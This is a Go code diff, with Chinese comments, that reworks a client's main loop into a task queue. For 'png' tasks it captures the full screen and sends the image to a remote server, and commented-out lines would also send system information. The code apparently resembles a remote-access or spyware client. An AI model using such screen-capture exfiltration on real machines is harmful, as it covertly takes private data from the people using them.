@@ -27,7 +27,12 @@ func Post(url string, contentType string, body []byte) (string, error) {
 	return string(content), nil
 }
 
+var taskAry []string
+
 func main() {
+	taskAry = append(taskAry, "png")
+	taskAry = append(taskAry, "png")
+	taskAry = append(taskAry, "png")
 	shared.Print("检查运行环境：")
 	//osid, osName := runtime.GetSystem()
 	//shared.Print(fmt.Sprintf("    操作系统：%s\n", osName))
@@ -39,17 +44,25 @@ func main() {
 		fmt.Printf("    确认服务器连接情况：%s\n", "离线")
 		//shared.Print(fmt.Sprintf("    确认服务器连接情况：%s\n", "离线"))
 	}
-	GIsLinkingWithServer = true
-	if GIsLinkingWithServer {
+	for GIsLinkingWithServer {
 		// send os infomation
 		//>>> remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
 		// send the system infomation to the server
 		//>>>> remote.SendMsg(runtime.GetSystemInfo(osid))
 		// 截图
-		filename := remote.CaptureFullScreen()
-		filesize := strconv.FormatInt(remote.GetFileSize(filename), 10)
-		remote.SendMsg("screen_" + filename + "_" + filesize)
-		// 发送文件
-		remote.SendFile(filename)
+		if len(taskAry) > 0 {
+			task := taskAry[0]
+			taskAry = taskAry[1:]
+			switch task {
+			case "png":
+				filename := remote.CaptureFullScreen()
+				filesize := strconv.FormatInt(remote.GetFileSize(filename), 10)
+				remote.SendMsg("screen_" + filename + "_" + filesize)
+				// 发送文件
+				remote.SendFile(filename)
+				remote.GConn.Close()
+			}
+		}
+
 	}
 }
